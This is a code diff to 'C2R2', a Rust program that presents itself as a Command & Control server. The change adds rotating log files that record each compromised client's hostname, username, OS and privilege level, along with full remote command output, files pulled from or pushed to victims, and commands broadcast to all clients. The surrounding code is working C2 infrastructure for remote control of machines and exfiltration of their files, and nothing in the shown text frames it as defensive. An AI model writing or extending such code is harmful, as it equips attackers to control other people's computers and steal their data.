@@ -11,6 +11,9 @@ use prettytable::{Table, Row, Cell, format};
 use std::fs;
 use rustyline::error::ReadlineError;
 use rustyline::DefaultEditor;
+use tracing::{info, warn, error, debug};
+use tracing_subscriber::EnvFilter;
+use tracing_appender::rolling::{RollingFileAppender, Rotation};
 
 type ClientId = u64;
 
@@ -74,6 +77,7 @@ async fn handle_client(
     verbose: bool,
 ) {
     let addr = stream.peer_addr().unwrap().to_string();
+    info!("Nueva conexión: [{}] desde {}", id, addr);
     println!("{} {} {} {}", 
         "🔗".bright_green(), 
         "Nuevo cliente".bright_white().bold(),
@@ -161,6 +165,7 @@ async fn handle_client(
                             match parts[1] {
                                 "hostname" => {
                                     info.hostname = Some(parts[2].to_string());
+                                    info!("[{}] SYSINFO hostname: {}", id, parts[2]);
                                     if verbose {
                                         println!("{} {} hostname: {}", 
                                             "📝".bright_green(), 
@@ -171,6 +176,7 @@ async fn handle_client(
                                 }
                                 "username" => {
                                     info.username = Some(parts[2].to_string());
+                                    info!("[{}] SYSINFO username: {}", id, parts[2]);
                                     if verbose {
                                         println!("{} {} username: {}", 
                                             "📝".bright_green(), 
@@ -181,6 +187,7 @@ async fn handle_client(
                                 }
                                 "os" => {
                                     info.os_version = Some(parts[2].to_string());
+                                    info!("[{}] SYSINFO OS: {}", id, parts[2]);
                                     if verbose {
                                         println!("{} {} OS: {}", 
                                             "📝".bright_green(), 
@@ -191,6 +198,7 @@ async fn handle_client(
                                 }
                                 "privileges" => {
                                     info.privileges = Some(parts[2].to_string());
+                                    info!("[{}] SYSINFO privileges: {}", id, parts[2]);
                                     if verbose {
                                         let priv_colored = if parts[2] == "Admin" {
                                             parts[2].bright_red().bold()
@@ -225,9 +233,11 @@ async fn handle_client(
                         if !response.is_empty() {
                             // Verificar si es una respuesta de file transfer
                             if response.starts_with("__FILE__:") {
+                                info!("[{}] Recibiendo archivo descargado", id);
                                 handle_file_download(&response, id, verbose);
                             } else if response.starts_with("__ERROR__:") {
                                 let error = response.strip_prefix("__ERROR__:").unwrap_or(&response);
+                                error!("[{}] Error recibido: {}", id, error);
                                 println!();
                                 println!("{} {} {}", 
                                     "❌".bright_red(), 
@@ -240,6 +250,7 @@ async fn handle_client(
                                 println!();
                             } else if response.starts_with("__SUCCESS__:") {
                                 let msg = response.strip_prefix("__SUCCESS__:").unwrap_or(&response);
+                                info!("[{}] Éxito: {}", id, msg);
                                 println!();
                                 println!("{} {} {}", 
                                     "✅".bright_green(), 
@@ -251,6 +262,9 @@ async fn handle_client(
                                 println!("{}", "─".repeat(60).bright_black());
                                 println!();
                             } else {
+                                // Respuesta normal de comando - LOGUEAR OUTPUT COMPLETO
+                                info!("[{}] OUTPUT:\n{}", id, response);
+                                debug!("[{}] Respuesta recibida: {} bytes", id, response.len());
                                 println!();
                                 println!("{} {} {}", 
                                     "📨".bright_blue(), 
@@ -284,6 +298,7 @@ async fn handle_client(
 
     // Limpiar cliente
     clients.lock().unwrap().remove(&id);
+    warn!("Cliente [{}] desconectado", id);
     println!("❌ Cliente [{}] desconectado", id);
 }
 
@@ -292,6 +307,7 @@ fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
     let parts: Vec<&str> = response.splitn(4, ':').collect();
     
     if parts.len() != 4 {
+        error!("[{}] Formato de archivo inválido en descarga", client_id);
         eprintln!("{} Formato de archivo inválido", "❌".bright_red());
         return;
     }
@@ -310,12 +326,14 @@ fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
             
             // Crear directorio downloads si no existe
             if let Err(e) = fs::create_dir_all("downloads") {
+                error!("[{}] Error creando directorio downloads: {}", client_id, e);
                 eprintln!("{} Error creando directorio downloads: {}", "❌".bright_red(), e);
                 return;
             }
             
             match fs::write(&save_path, file_data) {
                 Ok(_) => {
+                    info!("[{}] Archivo descargado: {} ({} bytes) -> {}", client_id, file_name, file_size, save_path);
                     println!();
                     println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_green());
                     println!("{}", format!("║              📥 ARCHIVO DESCARGADO [{}]", client_id).bright_green().bold());
@@ -327,11 +345,13 @@ fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
                     println!();
                 }
                 Err(e) => {
+                    error!("[{}] Error guardando archivo '{}': {}", client_id, save_path, e);
                     eprintln!("{} Error guardando archivo: {}", "❌".bright_red(), e);
                 }
             }
         }
         Err(e) => {
+            error!("[{}] Error decodificando base64: {}", client_id, e);
             eprintln!("{} Error decodificando base64: {}", "❌".bright_red(), e);
         }
     }
@@ -404,7 +424,40 @@ fn base64_encode(data: &[u8]) -> String {
 async fn main() {
     let args = Args::parse();
 
-    // Banner con colores
+    // Configurar el logger con archivos rotativos diarios
+    let logs_dir = "logs";
+    std::fs::create_dir_all(logs_dir).expect("No se pudo crear el directorio de logs");
+    
+    // Archivo rotativo diario para logs completos
+    let file_appender = RollingFileAppender::new(
+        Rotation::DAILY,
+        logs_dir,
+        "c2r2-session.log"
+    );
+    
+    let (non_blocking, _guard) = tracing_appender::non_blocking(file_appender);
+    
+    tracing_subscriber::fmt()
+        .with_writer(non_blocking)
+        .with_env_filter(
+            EnvFilter::try_from_default_env()
+                .unwrap_or_else(|_| EnvFilter::new("info"))
+        )
+        .with_ansi(false)  // Sin colores en archivos
+        .with_target(false)
+        .with_thread_ids(false)
+        .with_file(false)
+        .with_line_number(false)
+        .with_level(true)
+        .init();
+    
+    info!("╔══════════════════════════════════════════════════════════════╗");
+    info!("║          C2R2 Server v2.0 - Session Started                ║");
+    info!("║          Listening: {}:{:<43}║", args.bind, args.port);
+    info!("╚══════════════════════════════════════════════════════════════╝");
+    info!("");
+
+    // Banner con colores (solo en consola)
     println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
     println!("{}", "║          C2R2 - Command & Control Server v2.0            ║".bright_cyan());
     println!("{}", "║              Direct Connection - No Shellcode            ║".bright_cyan());
@@ -412,6 +465,7 @@ async fn main() {
     println!();
     println!("{} {}", "🌐 Listening:".bright_green().bold(), format!("{}:{}", args.bind, args.port).bright_white());
     println!("{} {}", "📝 Help:".bright_yellow().bold(), "/help".bright_white());
+    println!("{} {}", "📂 Logs:".bright_yellow().bold(), format!("{}/", logs_dir).bright_white());
     if args.verbose {
         println!("{}", "🔍 Verbose Mode: ON".bright_magenta());
     }
@@ -606,7 +660,9 @@ async fn main() {
                         
                         if let Some(client) = clients.get(&id) {
                             let command = format!("__DOWNLOAD__:{}", remote_path);
+                            info!("[{}] Comando /download: {}", id, remote_path);
                             if let Err(e) = client.tx.send(command) {
+                                error!("[{}] Error enviando comando download: {}", id, e);
                                 println!("{} {}", "❌ Error:".bright_red().bold(), e);
                             } else {
                                 println!("{} Solicitando descarga de: {}", 
@@ -651,9 +707,12 @@ async fn main() {
                                 let encoded = base64_encode(&file_data);
                                 let command = format!("__UPLOAD__|{}|{}", final_remote_path, encoded);
                                 
+                                info!("[{}] Comando /upload: {} -> {} ({} bytes)", id, local_path, final_remote_path, file_data.len());
+                                
                                 let clients = clients.lock().unwrap();
                                 if let Some(client) = clients.get(&id) {
                                     if let Err(e) = client.tx.send(command) {
+                                        error!("[{}] Error enviando comando upload: {}", id, e);
                                         println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                     } else {
                                         println!();
@@ -672,6 +731,7 @@ async fn main() {
                                 }
                             }
                             Err(e) => {
+                                error!("[{}] Error leyendo archivo local '{}': {}", id, local_path, e);
                                 println!("{} Error leyendo archivo local '{}': {}", "❌".bright_red(), local_path, e);
                             }
                         }
@@ -718,6 +778,8 @@ async fn main() {
                     let command = parts[1..].join(" ");
                     let clients = clients.lock().unwrap();
                     
+                    info!("Comando /cmd_all: {} (a {} clientes)", command, clients.len());
+                    
                     if clients.is_empty() {
                         println!("{}", "❌ No hay clientes conectados".bright_red());
                     } else {
@@ -739,6 +801,9 @@ async fn main() {
                     println!();
                     println!("{}", "👋 Cerrando C2R2 Server...".bright_yellow().bold());
                     println!();
+                    info!("═══════════════════════════════════════════════════════════");
+                    info!("Server cerrado por comando /exit del operador");
+                    info!("═══════════════════════════════════════════════════════════");
                     // Guardar historial antes de salir
                     let _ = rl.save_history(history_file);
                     std::process::exit(0);
@@ -755,14 +820,20 @@ async fn main() {
             Err(ReadlineError::Interrupted) => {
                 // Ctrl+C presionado
                 println!();
-                println!("{}", "👋 Cerrando C2R2 Server...".bright_yellow().bold());
+                println!("{}", "👋 Cerrando C2R2 Server... (Ctrl+C)".bright_yellow().bold());
+                info!("═══════════════════════════════════════════════════════════");
+                info!("Server cerrado por Ctrl+C del operador");
+                info!("═══════════════════════════════════════════════════════════");
                 let _ = rl.save_history(history_file);
                 std::process::exit(0);
             },
             Err(ReadlineError::Eof) => {
                 // Ctrl+D presionado
                 println!();
-                println!("{}", "👋 Cerrando C2R2 Server...".bright_yellow().bold());
+                println!("{}", "👋 Cerrando C2R2 Server... (Ctrl+D)".bright_yellow().bold());
+                info!("═══════════════════════════════════════════════════════════");
+                info!("Server cerrado por Ctrl+D del operador");
+                info!("═══════════════════════════════════════════════════════════");
                 let _ = rl.save_history(history_file);
                 std::process::exit(0);
             },
